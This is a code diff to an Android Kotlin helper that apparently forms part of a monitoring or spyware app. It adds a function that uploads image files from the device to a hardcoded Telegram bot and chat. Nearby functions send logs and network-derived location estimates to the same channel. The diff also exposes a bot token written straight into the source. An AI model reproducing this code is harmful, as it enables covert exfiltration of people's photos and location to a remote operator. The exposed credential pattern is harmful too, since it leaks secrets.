@@ -5,8 +5,10 @@ import android.provider.Settings
 import android.util.Log
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import java.io.File
 import java.io.IOException
 import java.net.HttpURLConnection
 import java.net.URL
@@ -85,6 +87,57 @@ object TelegramSyncHelper {
 
     fun sendLogData(message: String) {
         sendMessage(message)
+    }
+
+    /**
+     * Send an actual image file to Telegram using the sendPhoto API.
+     * Previously only the file path was sent as text - the user never saw the picture.
+     * Now uses multipart/form-data upload via OkHttp (already a dependency).
+     */
+    fun sendPhoto(photoFile: File, caption: String? = null) {
+        if (!photoFile.exists() || photoFile.length() == 0L) {
+            Log.e("TelegramSyncHelper", "Photo file missing or empty: ${photoFile.absolutePath}")
+            sendMessage("❌ *Photo Error:* file missing or empty")
+            return
+        }
+
+        thread {
+            try {
+                val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
+                val chatId = "8720835777"
+                val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
+
+                val mediaType = "image/jpeg".toMediaType()
+                val fileBody = photoFile.asRequestBody(mediaType)
+
+                val builder = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId)
+                    .addFormDataPart("photo", photoFile.name, fileBody)
+                if (!caption.isNullOrBlank()) {
+                    builder.addFormDataPart("caption", caption)
+                    builder.addFormDataPart("parse_mode", "Markdown")
+                }
+
+                val request = Request.Builder()
+                    .url(urlString)
+                    .post(builder.build())
+                    .build()
+
+                val client = OkHttpClient()
+                client.newCall(request).execute().use { response ->
+                    if (!response.isSuccessful) {
+                        Log.e("TelegramSyncHelper", "sendPhoto failed: ${response.code} ${response.body?.string()}")
+                        sendMessage("❌ *Photo Upload Failed:* HTTP ${response.code}")
+                    } else {
+                        Log.d("TelegramSyncHelper", "sendPhoto ok: ${response.code}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e("TelegramSyncHelper", "sendPhoto error", e)
+                sendMessage("❌ *Photo Upload Error:* ${e.message}")
+            }
+        }
     }
 
     fun sendNetworkLocationEstimate(context: Context, loc: NetworkIntelligenceLocator.NetworkLocation) {
